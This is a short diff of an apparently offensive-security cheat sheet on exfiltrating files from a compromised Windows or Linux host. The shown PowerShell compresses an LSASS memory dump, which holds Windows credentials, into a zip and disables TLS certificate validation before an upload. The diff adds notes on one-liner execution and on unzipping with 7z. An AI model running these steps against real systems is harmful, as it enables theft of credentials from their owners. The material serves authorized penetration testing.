@@ -9,7 +9,10 @@
     ```
 * Upload a file via [curl](../../Useful_Commands/Linux.html#upload-files-via-curl)(Linux) or [powershell](../../Useful_Commands/Windows.html#download-uploading-files)(Windows). Try to [compress](../../Network/Data_Exfiltration/Windows-Archiving_and_Compression.md#powershell) first
     * Windows
-       * Powershell (Possible to convert to one-liner and execute via *cmd*>`powershell "<b;e;l;o;w;>"`)
+       * Powershell
+           * Possible to convert to one-liner and execute
+                * `C:\Windows\system32>powershell "<b;e;l;o;w;>"`)
+                * Unzip with `7z x lsass.zip`
           ```powershell
           Compress-Archive -LiteralPath C:\Windows\temp\lsass.dmp -DestinationPath C:\Windows\temp\lsass.zip
           [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
